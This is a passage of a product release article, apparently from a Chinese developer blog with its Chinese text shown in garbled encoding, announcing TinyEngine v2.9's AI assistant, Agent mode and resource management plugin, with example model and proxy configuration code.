.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>TinyEngine æ˜¯ä¸€æ¬¾é¢å‘æœªæ¥çš„ä½ä»£ç å¼•æ“åº•åº§ï¼Œè‡´åŠ›äºä¸ºå¼€å‘è€…æä¾›é«˜åº¦å¯å®šåˆ¶çš„æŠ€æœ¯åŸºç¡€è®¾æ–½â€”â€”ä¸ä»…æ”¯æŒå¯è§†åŒ–é¡µé¢æ­å»ºç­‰æ ¸å¿ƒèƒ½åŠ›ï¼Œæ›´å¯é€šè¿‡ CLI å·¥ç¨‹åŒ–æ–¹å¼å®ç°æ·±åº¦äºŒæ¬¡å¼€å‘ï¼Œå¸®åŠ©å›¢é˜Ÿå¿«é€Ÿæ„å»ºä¸“å±çš„ä½ä»£ç å¹³å°ã€‚</p>
<p>æ— è®ºæ˜¯èµ„æºç¼–æ’ã€æœåŠ¡ç«¯æ¸²æŸ“ã€æ¨¡å‹é©±åŠ¨åº”ç”¨ï¼Œè¿˜æ˜¯ç§»åŠ¨ç«¯ã€å¤§å±ç«¯ã€å¤æ‚é¡µé¢ç¼–æ’åœºæ™¯ï¼ŒTinyEngine éƒ½èƒ½çµæ´»é€‚é…ï¼Œæˆä¸ºä½ æ„å»ºä½ä»£ç ä½“ç³»çš„åšå®åŸºçŸ³ã€‚</p>
<p>æœ€è¿‘æˆ‘ä»¬æ­£å¼å‘å¸ƒÂ <strong>TinyEngine v2.9 ç‰ˆæœ¬</strong>ï¼Œå¸¦æ¥å¤šé¡¹åŠŸèƒ½å‡çº§ä¸ä½“éªŒä¼˜åŒ–ï¼Œåœ¨å¢å¼ºå¹³å°æ™ºèƒ½åŒ–èƒ½åŠ›çš„åŒæ—¶ï¼Œè¿›ä¸€æ­¥é™ä½é…ç½®å¤æ‚åº¦ï¼Œè®©â€œå®šåˆ¶åŒ–â€å˜å¾—æ›´ç®€å•ã€æ›´é«˜æ•ˆã€‚</p>
<ul>
<li>å¼€æºåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine" target="_blank" title="https://github.com/opentiny/tiny-engine" ref="nofollow noopener noreferrer">github.com/opentiny/tiâ€¦</a>ï¼ˆæ¬¢è¿ Star â­ï¼‰</li>
<li>å®˜æ–¹ç½‘ç«™ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.design%2Ftiny-engine%23%2Fhome" target="_blank" title="https://opentiny.design/tiny-engine#/home" ref="nofollow noopener noreferrer">opentiny.design/tiny-engineâ€¦</a></li>
</ul>
<p>æœ¬æ¬¡ç‰ˆæœ¬è¿­ä»£ä¸­ï¼Œæˆ‘ä»¬æ¬£å–œåœ°çœ‹åˆ°è¶Šæ¥è¶Šå¤šå¼€å‘è€…åŠ å…¥å¼€æºå…±å»ºè¡Œåˆ—ã€‚ç‰¹åˆ«æ„Ÿè°¢<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffayching" title="https://github.com/fayching" target="_blank" ref="nofollow noopener noreferrer">@fayching</a>Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLLDLLY" title="https://github.com/LLDLLY" target="_blank" ref="nofollow noopener noreferrer">@LLDLLY</a>Â ç­‰ç¤¾åŒºä¼™ä¼´ç§¯æå‚ä¸åŠŸèƒ½è´¡çŒ®ä¸é—®é¢˜åé¦ˆã€‚æ­£æ˜¯è¿™äº›ç‚¹æ»´æ±‡èšçš„åŠ›é‡ï¼Œæ¨åŠ¨ç€ TinyEngine ä¸æ–­å‰è¡Œã€‚æˆ‘ä»¬ä¹Ÿè¯šæŒšé‚€è¯·æ›´å¤šçƒ­çˆ±æŠ€æœ¯ã€è¿½æ±‚åˆ›æ–°çš„æœ‹å‹åŠ å…¥ç¤¾åŒºï¼Œä¸€èµ·æ‰“é€ æ›´å¼ºå¤§ã€æ›´å¼€æ”¾çš„ä½ä»£ç ç”Ÿæ€ã€‚</p>
<h2 data-id="heading-1">v2.9.0 å˜æ›´ç‰¹æ€§æ¦‚è§ˆ</h2>
<ul>
<li>ã€å¢å¼ºã€‘å…¨æ–°ç‰ˆæœ¬AIåŠ©æ‰‹ï¼Œæ™ºèƒ½æ­å»ºèƒ½åŠ›å‡çº§</li>
<li>ã€æ–°ç‰¹æ€§ã€‘æ·»åŠ èµ„æºç®¡ç†æ’ä»¶å’Œèµ„æºé€‰æ‹©é…ç½®å™¨</li>
<li>ã€å¢å¼ºã€‘é¢„è§ˆæ’ä»¶æ”¯æŒåº”ç”¨é¢„è§ˆ</li>
<li>ã€å¢å¼ºã€‘Tailwindcssæ”¯æŒ</li>
<li>ã€å¢å¼ºã€‘æ”¯æŒé™æ€æ•°æ®æº</li>
<li>ã€å¢å¼ºã€‘ç»„ä»¶ç‰©æ–™æ›´æ–°</li>
<li>ã€å¢å¼ºã€‘MCPå·¥å…·æ›´æ–°</li>
<li>ã€å…¶ä»–ã€‘åŠŸèƒ½ç»†èŠ‚ä¼˜åŒ–ä¸bugä¿®å¤ã€‚</li>
</ul>
<h2 data-id="heading-2">TinyEngine v2.9.0 æ–°ç‰¹æ€§è§£è¯»</h2>
<h3 data-id="heading-3">1. ã€å¢å¼ºã€‘å…¨æ–°ç‰ˆæœ¬AIåŠ©æ‰‹ï¼Œæ™ºèƒ½æ­å»ºèƒ½åŠ›å‡çº§ï¼ˆä½“éªŒç‰ˆæœ¬ï¼‰</h3>
<p>åœ¨TinyEngine v2.9ç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬å¯¹AIæ­å»ºé¡µé¢èƒ½åŠ›è¿›è¡Œå…¨æ–°å‡çº§ï¼Œä¸‹é¢æ˜¯ä¸»è¦åŠŸèƒ½çš„ä»‹ç»ä¸å¿«é€Ÿä¸Šæ‰‹ï¼š</p>
<h4 data-id="heading-4">1ï¼‰å…¨æ–° Agent æ¨¡å¼</h4>
<p>æ–°å¢çš„ Agent æ¨¡å¼æ”¯æŒè‡ªç„¶è¯­è¨€æˆ–å›¾ç‰‡ç”Ÿæˆé¡µé¢ï¼Œå€ŸåŠ©AIå¤§æ¨¡å‹å¼ºå¤§çš„èƒ½åŠ›ï¼Œè®©æ‚¨å‘Šåˆ«ç¹ççš„æ‰‹åŠ¨æ‹–æ‹½ï¼Œè®© AI è¾…åŠ©å¼€å‘æ›´åŠ æ™ºèƒ½ã€å¼ºå¤§ã€‚</p>
<ul>
<li>å…¨æ–° Agent æ™ºèƒ½æ­å»ºæ¨¡å¼ï¼Œè‡ªç„¶è¯­è¨€æè¿°éœ€æ±‚ï¼Œç”±AIç›´æ¥è¿”å›é¡µé¢Schema</li>
<li>ç”»å¸ƒé‡‡ç”¨æµå¼æ¸²æŸ“ï¼Œèƒ½å¤Ÿå®æ—¶çœ‹åˆ°é¡µé¢ç”Ÿæˆæ•ˆæœ</li>
<li>ç”Ÿæˆé¡µé¢åæ”¯æŒç»§ç»­å¯¹è¯äºŒæ¬¡ä¿®æ”¹ï¼Œä½¿ç”¨å¢é‡è¿”å›ä¿®æ”¹é€Ÿåº¦æ›´å¿«
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cef1f08d070b44f5914dce0e9d3c723f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=yo6f48s6haHeRS5Cy%2F%2FRGfn4ils%3D" alt="1.gif" loading="lazy"/></li>
<li>æ”¯æŒä¸Šä¼ è®¾è®¡å›¾æˆ–æ‰‹ç»˜è‰å›¾ï¼ŒAI è¯†åˆ«å¹¶è¿˜åŸä¸ºå¯ç¼–è¾‘çš„é¡µé¢ï¼ˆéœ€è¦å…ˆé€‰æ‹©è§†è§‰æ¨¡å‹ï¼‰
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72b42e61e6e1438da5f851124a74b09a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=7tb9llBo8zUasSbWNZ0A8xXySEs%3D" alt="2.gif" loading="lazy"/></li>
</ul>
<h4 data-id="heading-5">2ï¼‰åŸºç¡€èƒ½åŠ›å‡çº§</h4>
<ul>
<li>ç°ä»£åŒ–ç•Œé¢ï¼šå…¨æ–°çš„èŠå¤©ç•Œé¢ï¼Œæ”¯æŒ Markdown æ¸²æŸ“ã€ä»£ç é«˜äº®<br/>
å…¨å±æ¨¡å¼ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a0857e100044548a46bd97d8e683b23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=0%2FYsEZ5csqANNaDKvt6ixnIQfjw%3D" alt="3.png" loading="lazy"/></li>
<li>ä¼šè¯ç®¡ç†ï¼šæ”¯æŒæŸ¥çœ‹ç®¡ç†å¤šä¸ªå†å²å¯¹è¯ï¼Œè‡ªåŠ¨ä¿å­˜å†å²è®°å½•æ€è€ƒæ¨¡å¼ï¼šæ”¯æŒæ¨ç†æ¨¡å‹çš„æ·±åº¦æ€è€ƒï¼Œæä¾›æ›´å‡†ç¡®çš„è§£å†³æ–¹æ¡ˆ</li>
<li>å¤šæ¨¡å‹æ”¯æŒï¼šå…¼å®¹å„ç§OpenAIå…¼å®¹æ ¼å¼ AI æ¨¡å‹ï¼Œæä¾›æ¨¡å‹è®¾ç½®ç•Œé¢è‡ªç”±æ·»åŠ é€‰æ‹©æ¨¡å‹æœåŠ¡</li>
</ul>

<ul>
<li>é›†æˆå¹³å°æ›´å¤šçš„MCPå·¥å…·ï¼ˆChatæ¨¡å¼ï¼‰
å·¥å…·è°ƒç”¨ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a93601c726d45abb2fccecb954935cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=QYheQdfg9vcQ%2BMCJ5lwCkfBX9BQ%3D" alt="4.png" loading="lazy"/></li>
</ul>
<h4 data-id="heading-6">3ï¼‰ç®€å•é…ç½®ï¼Œå¿«é€Ÿä¸Šæ‰‹</h4>
<p>å¹³å°è®¾ç½®ï¼š</p>
<ul>
<li>
<p>è®¾ç½®æ¨¡å‹æœåŠ¡ï¼šÂ </p>
<p>æ”¯æŒé€šè¿‡AIæ’ä»¶çš„<code>customCompatibleAIModels</code>é€‰é¡¹è‡ªå®šä¹‰æ·»åŠ OpenAIå…¼å®¹æ ¼å¼å¤§æ¨¡å‹ï¼ˆä½¿ç”¨MCPåŠŸèƒ½éœ€è¦ä½¿ç”¨æ”¯æŒtoolsçš„å¤§æ¨¡å‹ï¼‰ï¼Œå»ºè®®ä½¿ç”¨DeepSeek R1/V3ã€Qwen3ã€Geminiç­‰å¯¹è§†è§‰/å·¥å…·æ”¯æŒè‰¯å¥½çš„æ¨¡å‹ï¼Œä¼˜å…ˆä½¿ç”¨æ»¡è¡€æ¨¡å‹ã€æ¨ç†ç±»å‹æ¨¡å‹æ•ˆæœæ›´å¥½ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// registry.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-comment">// ......</span>
  [<span class="hljs-variable constant_">META_APP</span>.<span class="hljs-property">Robot</span>]: {
    <span class="hljs-attr">options</span>: {
      <span class="hljs-comment">// encryptServiceApiKey: false, // æ˜¯å¦åŠ å¯†æœåŠ¡APIå¯†é’¥, é»˜è®¤ä¸ºfalse</span>
      <span class="hljs-comment">// enableResourceContext: false, // æç¤ºè¯ä¸Šä¸‹æ–‡æºå¸¦èµ„æºæ’ä»¶å›¾ç‰‡ï¼Œé»˜è®¤true</span>
      <span class="hljs-comment">// enableRagContext: true, // æç¤ºè¯ä¸Šä¸‹æ–‡æºå¸¦æŸ¥è¯¢åˆ°çš„çŸ¥è¯†åº“å†…å®¹ï¼Œé»˜è®¤false</span>
      <span class="hljs-attr">customCompatibleAIModels</span>: [{ <span class="hljs-comment">// è‡ªå®šä¹‰AIæ¨¡å‹(OpenAIå…¼å®¹æ ¼å¼æ¨¡å‹), ä¸‹é¢ä»¥æ™ºè°±æ¨¡å‹æœåŠ¡ä¸ºä¾‹</span>
        <span class="hljs-attr">provider</span>: <span class="hljs-string">'GLM'</span>,
        <span class="hljs-attr">label</span>: <span class="hljs-string">'æ™ºè°±æ¨¡å‹'</span>,
        <span class="hljs-attr">baseUrl</span>: <span class="hljs-string">'https://open.bigmodel.cn/api/paas/v4'</span>,
        <span class="hljs-attr">models</span>: [
          {
            <span class="hljs-attr">label</span>: <span class="hljs-string">'GLMè§†è§‰ç†è§£æ¨¡å‹'</span>,
            <span class="hljs-attr">name</span>: <span class="hljs-string">'glm-4.5v'</span>,
            <span class="hljs-attr">capabilities</span>: {
              <span class="hljs-attr">vision</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// æ˜¯å¦æ”¯æŒè§†è§‰ç†è§£èƒ½åŠ›</span>
              <span class="hljs-attr">reasoning</span>: { <span class="hljs-attr">extraBody</span>: { <span class="hljs-attr">enable</span>: { <span class="hljs-attr">thinking</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'enabled'</span> } }, <span class="hljs-attr">disable</span>: <span class="hljs-literal">null</span> } } <span class="hljs-comment">// æ˜¯å¦æ”¯æŒæ·±åº¦æ€è€ƒåŠæ·±åº¦æ€è€ƒæ‰“å¼€ä¸å…³é—­é¢å¤–çš„bodyå­—æ®µ</span>
            }
          },
          {
            <span class="hljs-attr">label</span>: <span class="hljs-string">'GLM-4.5æ¨ç†æ¨¡å‹'</span>,
            <span class="hljs-attr">name</span>: <span class="hljs-string">'glm-4.5'</span>,
            <span class="hljs-attr">capabilities</span>: {
              <span class="hljs-attr">toolCalling</span>: <span class="hljs-literal">true</span>,
              <span class="hljs-attr">reasoning</span>: { <span class="hljs-attr">extraBody</span>: { <span class="hljs-attr">enable</span>: { <span class="hljs-attr">thinking</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'enabled'</span> } }, <span class="hljs-attr">disable</span>: <span class="hljs-literal">null</span> } }
            }
          }
        ]
      }]
    }
  }
  <span class="hljs-comment">// ......</span>
}
</code></pre>
<p>å¯ä»¥é€šè¿‡å¯¹æ¥æœ€æ–°åç«¯æœåŠ¡ä½¿ç”¨å®Œæ•´çš„AIæ’ä»¶èƒ½åŠ›ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥åœ¨å‰ç«¯é¡¹ç›®é…ç½®AIæ¨¡å‹æ¥å£Proxyæ¥ä½¿ç”¨, è¿™é‡Œä»¥æœ¬åœ°è½¬å‘åˆ°ç™¾ç‚¼æ¨¡å‹ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">const</span> originProxyConfig = baseConfig.<span class="hljs-property">server</span>.<span class="hljs-property">proxy</span>
baseConfig.<span class="hljs-property">server</span>.<span class="hljs-property">proxy</span> = {
  <span class="hljs-string">'/app-center/api/chat/completions'</span>: {
    <span class="hljs-attr">target</span>: <span class="hljs-string">'https://dashscope.aliyuncs.com'</span>,
    <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">rewrite</span>: <span class="hljs-function"><span class="hljs-params">path</span> =&gt;</span> path.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'/app-center/api/'</span>, <span class="hljs-string">'/compatible-mode/v1/'</span>),
  },
  <span class="hljs-string">'/app-center/api/ai/chat'</span>: {
    <span class="hljs-attr">target</span>: <span class="hljs-string">'https://dashscope.aliyuncs.com'</span>,
    <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">rewrite</span>: <span class="hljs-function"><span class="hljs-params">path</span> =&gt;</span> path.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'/app-center/api/ai/chat'</span>, <span class="hljs-string">'/compatible-mode/v1/chat/completions'</span>),
  },
  ...originProxyConfig,
}
</code></pre>
<p>è¡¥å……è¯´æ˜ï¼šæˆªå›¾ç”ŸæˆUIèƒ½åŠ›ç”±äºä¾èµ–ä¸Šä¼ å›¾ç‰‡æ¥å£ï¼Œéœ€è¦å¯åŠ¨åç«¯æœåŠ¡ï¼Œä¸”éœ€è¦ä½¿ç”¨æ”¯æŒè§†è§‰ç†è§£èƒ½åŠ›çš„æ¨¡å‹ï¼Œå¦‚qwen-vlç³»åˆ—æ¨¡å‹
Â </p>
</li>
<li>
<p>æ’ä»¶é…ç½®ï¼š</p>
<p>åœ¨æ’ä»¶ä¸­ä¹Ÿæä¾›äº†å¯¹éƒ¨åˆ†åŠŸèƒ½çš„è‡ªå®šä¹‰èƒ½åŠ›ï¼ŒåŒ…æ‹¬æ˜¯å¦å¯ç”¨åŠ å¯†API Keyè§£å†³å®‰å…¨é£é™©é—®é¢˜ã€æ˜¯å¦ä½¿ç”¨çŸ¥è¯†åº“RAGèƒ½åŠ›æä¾›é¢å¤–çš„çŸ¥è¯†èƒŒæ™¯æå‡é—®ç­”å¯¹è¯æ•ˆæœã€æ˜¯å¦å…è®¸ä½¿ç”¨èµ„æºç®¡ç†æ’ä»¶ä¸­çš„å›¾ç‰‡ç­‰ï¼š</p>
<pre><code class="hljs language-js" lang="js">   <span class="hljs-comment">// registry.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  [<span class="hljs-variable constant_">META_APP</span>.<span class="hljs-property">Robot</span>]: {
    <span class="hljs-attr">options</span>: {
      <span class="hljs-comment">// encryptServiceApiKey: false, // æ˜¯å¦åŠ å¯†æœåŠ¡APIå¯†é’¥, é»˜è®¤ä¸ºfalse</span>
      <span class="hljs-comment">// enableResourceContext: false, // æç¤ºè¯ä¸Šä¸‹æ–‡æºå¸¦èµ„æºæ’ä»¶å›¾ç‰‡ï¼Œé»˜è®¤true</span>
      <span class="hljs-comment">// enableRagContext: true, // æç¤ºè¯ä¸Šä¸‹æ–‡æºå¸¦æŸ¥è¯¢åˆ°çš„çŸ¥è¯†åº“å†…å®¹ï¼Œé»˜è®¤false</span>
      <span class="hljs-comment">// modeImplementation: { // æ”¯æŒé€šè¿‡æ³¨å†Œè¡¨ä¼ å…¥chatå’Œagentæ¨¡å¼çš„å®ç°</span>
      <span class="hljs-comment">//   chat: useCustomChatMode</span>
      <span class="hljs-comment">//   agent: useCustomAgentMode</span>
      <span class="hljs-comment">// }</span>
    }
  }
}
</code></pre>
</li>
</ul>
<p>Â </p>
<p>ç”¨æˆ·è®¾ç½®ï¼š</p>
<ul>
<li>é…ç½®æœåŠ¡ä¸å¯†é’¥ï¼šåœ¨è®¾ç½®é¢æ¿ç¼–è¾‘å†…ç½®æœåŠ¡æ·»åŠ API Keyæˆ–è€…æ·»åŠ è‡ªå®šä¹‰çš„æ¨¡å‹æœåŠ¡
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69ed443b0650419a9ee0273b05b8b0e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=vJKeqD1HmdVAXXlDviPWhVbzvw4%3D" alt="5.gif" loading="lazy"/></li>
<li>é€‰æ‹©æ¨¡å‹ï¼šå¯ä»¥ä»å†…ç½®ç™¾ç‚¼ã€DeepSeek æˆ–è€…è‡ªå®šä¹‰çš„æ¨¡å‹æœåŠ¡ä¸­é€‰æ‹©æ¨¡å‹ï¼ˆå›¾ç‰‡ç”ŸæˆUIéœ€è¦å¤šæ¨¡æ€æ¨¡å‹ï¼ŒMCPå·¥å…·è°ƒç”¨éœ€è¦æ”¯æŒå·¥å…·è°ƒç”¨æ¨¡å‹ï¼‰</li>
<li>å¼€å§‹ä½¿ç”¨ï¼šåœ¨è¾“å…¥æ¡†è¾“å…¥é—®é¢˜æˆ–è€…ä¸Šä¼ å›¾ç‰‡é—®ç­”ï¼ŒåŒæ—¶å¯ä»¥è‡ªç”±åˆ‡æ¢ Agent/Chat æ¨¡å¼ï¼Œé…ç½®MCPå·¥å…·ï¼Œå¼€å¯æ·±åº¦æ€è€ƒç­‰ï¼Œä»æ™ºèƒ½æ­å»ºåˆ°æ·±åº¦è¾…åŠ©ï¼Œå…¨æ–¹ä½æå‡æ‚¨çš„å¼€å‘æ•ˆç‡ã€‚å¿«æ¥ä½“éªŒï¼Œé‡Šæ”¾æ‚¨çš„åˆ›é€ åŠ›ï¼</li>
</ul>
<h3 data-id="heading-7">2.ã€æ–°ç‰¹æ€§ã€‘æ·»åŠ èµ„æºç®¡ç†æ’ä»¶å’Œèµ„æºé€‰æ‹©é…ç½®å™¨</h3>
<p>åœ¨åº”ç”¨å¼€å‘ä¸­ï¼Œé€šå¸¸ä¼šéœ€è¦å¼•ç”¨å›¾ç‰‡ç­‰èµ„æºï¼Œèµ„æºç®¡ç†æ’ä»¶ä¸»è¦æ»¡è¶³è¿™ç±»åœºæ™¯éœ€æ±‚ï¼Œå¯ä»¥ä¸Šä¼ é¡¹ç›®ä¸­ç”¨åˆ°çš„é™æ€èµ„æºï¼Œåœ¨ç¼–æ’é¡µé¢æˆ–AIç”Ÿæˆé¡µé¢æ—¶å¼•ç”¨ï¼ˆå½“å‰ä»…æ”¯æŒå›¾ç‰‡æ ¼å¼é™„ä»¶ï¼‰ã€‚</p>
<h4 data-id="heading-8">2.1 èµ„æºç®¡ç†</h4>
<p>1ï¼‰èµ„æºåˆ†ç»„ï¼šèµ„æºç®¡ç†æ’ä»¶é€šè¿‡åˆ†ç»„ç®¡ç†èµ„æºï¼Œä¸Šä¼ èµ„æºä¹‹å‰éœ€è¦å…ˆåˆ›å»ºåˆ†ç»„ï¼Œå¯ä»¥ä¸ºä¸åŒåœºæ™¯çš„é™æ€èµ„æºè¿›è¡Œåˆ†ç»„ï¼Œæ¯”å¦‚åŸºç¡€å›¾æ ‡åº“ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥æŒ‰æ¨¡å—åˆ†ç±»
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c15b8468b7294966a078ee1ca1516564~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=Y%2FFsbf%2BjIxzCtkA2xYtfjmNMY74%3D" alt="6.png" loading="lazy"/>
åˆ›å»ºå¥½åˆ†ç»„åï¼Œç‚¹å‡»åˆ†ç»„åå¯ä»¥ç®¡ç†å½“å‰èµ„æºåˆ†ç»„
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b28de09625914586b14c154b32679dec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=z3e4E0d4bVO4V2%2BAHGFczAGzj5U%3D" alt="7.png" loading="lazy"/></p>
<p>2ï¼‰æ·»åŠ èµ„æº<br/>
æ·»åŠ èµ„æºåˆ†ä¸ºä¸¤ç§æ–¹å¼ï¼Œè¾“å…¥URLå’Œåç§°æ·»åŠ ç½‘ç»œèµ„æºï¼Œä¸Šä¼ å›¾ç‰‡æˆ–å›¾æ ‡èµ„æºã€‚
å…¶ä¸­èµ„æºåç§°å¿…å¡«ï¼Œé€šè¿‡urlæ·»åŠ çš„è¯urlä¹Ÿå¿…å¡«ï¼Œå¦‚æœæ˜¯ä¸Šä¼ çš„ï¼Œåˆ™ä¸èƒ½è¾“å…¥url,æ”¯æŒä¸Šä¼ pngã€jpgã€svgæ–‡ä»¶ï¼Œæ”¯æŒæ‰¹é‡ä¸Šä¼ 
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef4799b733e442819b63e1a38be893c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=fmFgVi6AE6TFuckO1DX3TnZWIhg%3D" alt="8.png" loading="lazy"/></p>
<p>3ï¼‰ä¿®æ”¹èµ„æº<br/>
å·²æ·»åŠ èµ„æºçš„ç®¡ç†ï¼Œhoveræ—¶æ˜¾ç¤ºåç§°ï¼Œæ“ä½œåŒ…æ‹¬å¤åˆ¶å’Œåˆ é™¤ï¼Œå¤åˆ¶æ˜¯å¤åˆ¶æ·»åŠ å®Œæˆååœ¨ç”¨æˆ·æœåŠ¡å™¨ä¸Šçš„urlåœ°å€
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/806cd90d680b4b9fa0205653db29b7b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=frjpQkQrj8HfrS3aQCtNIFmj6ks%3D" alt="9.png" loading="lazy"/>
ä¹Ÿæ”¯æŒæ‰¹é‡æ“ä½œï¼Œç‚¹å‡»æ‰¹é‡æ“ä½œåï¼Œå‡ºç°åˆ é™¤å›¾æ ‡ï¼ˆåç»­è¿˜ä¼šæ‰©å±•å…¶ä»–æ‰¹é‡æ“ä½œï¼‰ï¼Œä¸”èµ„æºå˜ä¸ºå¯å¤šé€‰çš„çŠ¶æ€
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09d0a772610f48d4a1e473d0c78c7d89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=WH5KwIXASk3p3mnd3twtdr2i6d0%3D" alt="10.png" loading="lazy"/></p>
<p>Â </p>
<h4 data-id="heading-9">2.2 èµ„æºä½¿ç”¨</h4>
<p>1ï¼‰åœ¨ç”»å¸ƒä¸­ä½¿ç”¨</p>
<p>å¯ä»¥é€šè¿‡å›¾ç‰‡ç»„ä»¶ä½¿ç”¨èµ„æºï¼Œé€‰ä¸­å›¾ç‰‡ç»„ä»¶ååœ¨å›¾ç‰‡çš„å±æ€§è®¾ç½®å¤„ï¼Œç‚¹å‡»é€‰æ‹©èµ„æºå¯ä»¥è®¾ç½®ä¸ºèµ„æºç®¡ç†ä¸­çš„å›¾ç‰‡</p>
<p><strong>æ•ˆæœ</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e158a16ad43b4da8a42aa37b90a80dfb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=dWjGUAmHh1oiAUJlQ0MyJ3Rip2Y%3D" alt="11.png" loading="lazy"/></p>
<p>2ï¼‰åœ¨AIæ’ä»¶ä¸­ä½¿ç”¨</p>
<p>åœ¨AIæ’ä»¶Agentæ¨¡å¼ç”Ÿæˆé¡µé¢æ—¶ï¼Œé¡µé¢ä¸­ç»å¸¸ä¼šéœ€è¦ä½¿ç”¨åˆ°å›¾ç‰‡èµ„æºï¼ŒAIæ— æ³•ç›´æ¥ç”Ÿæˆè¿™äº›å›¾ç‰‡ï¼Œé»˜è®¤ä¼šå°†å½“å‰èµ„æºç®¡ç†æ’ä»¶çš„å›¾ç‰‡ä½œä¸ºå¤‡ç”¨èµ„æºå¼•å…¥ä½¿ç”¨ï¼ˆä»…ä½¿ç”¨å¸¦æœ‰æè¿°ä»‹ç»çš„å›¾ç‰‡ï¼‰ã€‚ä¾‹å¦‚â€œç”Ÿæˆç™»å½•é¡µé¢â€è‡ªåŠ¨å¼•ç”¨èƒŒæ™¯å›¾ä¸Logoï¼š</p>
